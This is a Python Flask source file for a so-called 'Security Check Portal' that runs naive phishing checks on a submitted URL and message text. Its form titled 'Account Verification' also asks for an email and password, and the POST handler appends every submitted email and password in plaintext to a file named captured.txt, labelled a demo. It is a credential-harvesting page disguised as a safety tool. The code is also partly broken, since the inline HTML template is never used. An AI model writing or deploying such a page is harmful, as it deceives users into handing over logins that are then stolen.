from flask import Flask, request, render_template
import re

app = Flask(__name__)

def detect_keywords(text):
    keywords = ["verify", "urgent", "suspend", "click", "password", "bank", "reset"]
    return [k for k in keywords if k in text.lower()]

def detect_url(url):
    if "http://" in url:
        return "⚠️ Not secure (HTTP)"
    if "@" in url or "-" in url:
        return "⚠️ Suspicious URL pattern"
    return "✅ URL seems safe"

html_page = """
<!DOCTYPE html>
<html>
<head>
<title>Security Check Portal</title>
<style>
body { font-family: Arial; background:#f1f3f4; text-align:center; }
.box { background:white; padding:30px; margin:100px auto; width:350px; border-radius:10px; }
input, button { width:90%; padding:10px; margin:10px; }
button { background:#1a73e8; color:white; border:none; }
.result { margin-top:20px; font-weight:bold; }
</style>
</head>
<body>

<div class="box">
<h2>Account Verification</h2>

<form method="POST">
<input name="url" placeholder="Enter website URL"><br>
<input name="message" placeholder="Enter message content"><br>
<input name="email" placeholder="Email"><br>
<input name="password" placeholder="Password"><br>
<button type="submit">Check Security</button>
</form>

<div class="result">
%s
</div>

</div>

</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def home():
    result = ""

    if request.method == "POST":
        url = request.form.get("url")
        message = request.form.get("message")
        email = request.form.get("email")
        password = request.form.get("password")

        # Save captured data (demo)
        with open("captured.txt", "a") as f:
            f.write(f"{email} | {password}\n")

        # Detection
        url_result = detect_url(url)
        keywords = detect_keywords(message)

        result = f"{url_result}<br>"
        if keywords:
            result += f"⚠️ Keywords detected: {keywords}"
        else:
            result += "✅ No suspicious keywords"

    return render_template("index.html",result=result)

if __name__ == "__main__":
    app.run(debug=True)